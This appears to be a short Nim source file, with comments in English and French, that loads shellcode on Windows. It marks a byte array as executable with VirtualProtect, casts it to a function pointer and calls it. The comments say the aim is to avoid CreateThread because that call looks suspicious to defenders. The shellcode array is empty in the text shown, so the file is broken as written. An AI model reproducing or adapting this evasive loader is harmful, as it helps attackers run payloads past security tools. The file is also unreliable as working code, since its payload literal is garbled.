import winim/lean  # import winim library for direct interface with winapi function

# basic shellcode that pop a messagebox
let shellcode: array[321, byte] = [
byte ]

# using VirtualProtect and calling directly memory space of shellcode variable 
var  oldProtect: DWORD  # first we need to create a variable that will store old protection of memory address
let success = VirtualProtect(addr(shellcode), shellcode.len, PAGE_EXECUTE_READ, addr(oldProtect))

# validation
if success == False:
    echo "Protection change failed"
else: 
    echo "Protection change success"

# casting de pointer donc ici on fait croire à nim que ce truc c'est une fonction à executer
# l'interet ici est de ne plus utiliser createthread() qui est beaucoup trop suspect comme win api call

let fShellcode = cast[proc(){.nimcall.}](addr(shellcode))

# execute shellcode as a function
fShellcode()
